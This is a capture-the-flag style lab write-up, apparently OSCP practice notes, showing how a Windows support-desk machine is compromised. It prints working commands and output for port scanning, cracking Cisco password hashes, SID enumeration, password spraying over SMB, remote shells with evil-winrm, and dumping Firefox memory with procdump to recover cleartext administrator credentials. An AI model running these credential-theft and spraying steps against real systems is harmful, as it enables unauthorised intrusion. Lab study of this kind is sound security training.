#### port scan
`└─$ nmap -p- -sSCV 10.129.96.157 --min-rate 999 `
```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-28 02:50 EDT
Nmap scan report for 10.129.96.157
Host is up (0.12s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Microsoft-IIS/10.0
| http-title: Support Login Page
|_Requested resource was login.php
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc         Microsoft Windows RPC
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

#### web enumlation
check the 80 port, we enter a forum, get a user "hazard"

http://10.129.96.157/attachments/config.txt
```
version 12.2
no service pad
service password-encryption
!
isdn switch-type basic-5ess
!
hostname ios-1
!
security passwords min-length 12
enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91
!
username rout3r password 7             0242114B0E143F015F5D1E161713   
username admin privilege 15 password 7 02375012182C1A1D751618034F36415408
!
!
ip ssh authentication-retries 5
ip ssh version 2
!
!
router bgp 100
 synchronization
 bgp log-neighbor-changes
 bgp dampening
 network 192.168.0.0Â mask 300.255.255.0
 timers bgp 3 9
 redistribute connected
!
ip classless
ip route 0.0.0.0 0.0.0.0 192.168.0.1
!
!
access-list 101 permit ip any any
dialer-list 1 protocol ip list 101
!
no ip http server
no ip http secure-server
!
line vty 0 4
 session-timeout 600
 authorization exec SSH
 transport input ssh
```
we get a hash, crack it for a passwd
```
$1$pdQG$o8nrSzsGXeaduXrjlvKc91

hashcat -m 500 hash -a 0 ~/oscp/rockyou.txt 

$1$pdQG$o8nrSzsGXeaduXrjlvKc91:stealth1agent  
```
In the txt, we find some other formats of passwd, CIsco type 7, we can decode it, https://keydecryptor.com/decryption-tools/cisco7 
```
rout3r
$uperP@ssword

admin 
Q4)sJu\Y8qz*A3?d
```
#### foot hold
we have only one username, for more:

`└─$ rpcclient -U hazard%stealth1agent 10.129.96.157`
```
rpcclient $> querydominfo
result was NT_STATUS_CONNECTION_DISCONNECTED
rpcclient $> enumdomusers
result was NT_STATUS_CONNECTION_DISCONNECTED
rpcclient $> enumdomusers
result was NT_STATUS_CONNECTION_DISCONNECTED
rpcclient $> exit
```
reclient failed, but thsi credential works in SMB. tey other way to indentify users

`└─$ impacket-lookupsid hazard:stealth1agent@10.129.96.157`
```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Brute forcing SIDs at 10.129.96.157
[*] StringBinding ncacn_np:10.129.96.157[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112
500: SUPPORTDESK\Administrator (SidTypeUser)
501: SUPPORTDESK\Guest (SidTypeUser)
503: SUPPORTDESK\DefaultAccount (SidTypeUser)
504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)
513: SUPPORTDESK\None (SidTypeGroup)
1008: SUPPORTDESK\Hazard (SidTypeUser)
1009: SUPPORTDESK\support (SidTypeUser)
1012: SUPPORTDESK\Chase (SidTypeUser)
1013: SUPPORTDESK\Jason (SidTypeUser)
```
create a list of users and passwords brute force using nxc

`└─$ netexec smb 10.129.96.157 -u user -p password  --continue-on-success `  
```
SMB         10.129.96.157   445    SUPPORTDESK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:False)
SMB         10.129.96.157   445    SUPPORTDESK      [+] SupportDesk\hazard:stealth1agent 
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\support:stealth1agent STATUS_LOGON_FAILURE
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\chase:stealth1agent STATUS_LOGON_FAILURE
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\jason:stealth1agent STATUS_LOGON_FAILURE
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\support:$uperP@ssword STATUS_LOGON_FAILURE
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\chase:$uperP@ssword STATUS_LOGON_FAILURE
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\jason:$uperP@ssword STATUS_LOGON_FAILURE
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\support:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE
SMB         10.129.96.157   445    SUPPORTDESK      [+] SupportDesk\chase:Q4)sJu\Y8qz*A3?d 
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\jason:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE
```

`$ evil-winrm -i 10.129.96.157 -u chase -p 'Q4)sJu\Y8qz*A3?d'`

we can access to wwwroot, but cannot dir files, but we know, login.php is a file for login.

`PS C:\inetpub\wwwroot> type login.php`

```
</body>
<?php
session_start();
if( isset($_REQUEST['login']) && !empty($_REQUEST['login_username']) && !empty($_REQUEST['login_password'])) {
	if( $_REQUEST['login_username'] === 'admin@support.htb' && hash( 'sha256', $_REQUEST['login_password']) === '91c077fb5bcdd1eacf7268c945bc1d1ce2faf9634cba615337adbf0af4db9040') {
		$_SESSION['admin'] = "valid";
		header('Location: issues.php');
	}
	else
		header('Location: errorpage.php');
}
else if( isset($_GET['guest']) ) {
	if( $_GET['guest'] === 'true' ) {
		$_SESSION['guest'] = "valid";
		header('Location: issues.php');
	}
}


?>
</html>
```
Since we find firefox is installed, and some firefox processes are active

`PS C:\Users\Chase\Appdata\Roaming\Mozilla\Firefox> ps`
```
   1489      57    23652      78236              5124   1 explorer
   1067      71   155268     231852       5.89   6288   1 firefox
    347      19    10208      38736       0.05   6396   1 firefox
    401      34    39520      97552       0.98   6532   1 firefox
    377      29    25072      62572       0.31   6808   1 firefox
    355      25    16424      38956       0.06   7080   1 firefox
```
try to use procdump64 to get the dump of firefox crash image, if we can

`upload oscp/procdump64.exe`

`.\procdump64.exe -e`
```
Use -accepteula to accept EULA.
```
`.\procdump64.exe -accepteula`

use the PID to create dmp file

`PS C:\Users\Chase\Appdata\Roaming\Mozilla\Firefox> .\procdump64.exe -ma 6288`

```
<Snip...>
FirefoxMOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=ååååà)ç;ú~Æ2
```
#### Privi escalate
                                                                                                           
┌──(ed㉿kali)-[~/oscp]
`└─$ evil-winrm -i 10.129.96.157 -u administrator -p '4dD!5}x/re8]FBuZ' `
```                           
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
supportdesk\administrator
```

#### lesson learned
- show hidden folders on Window, PS Get-Childitem
- \Users\Chase\Appdata\Roaming\  : for roaming folder, Browser bookmarks, custom dictionaries, and app configuration profiles
- impacket-lookupsid , and other tools of this set
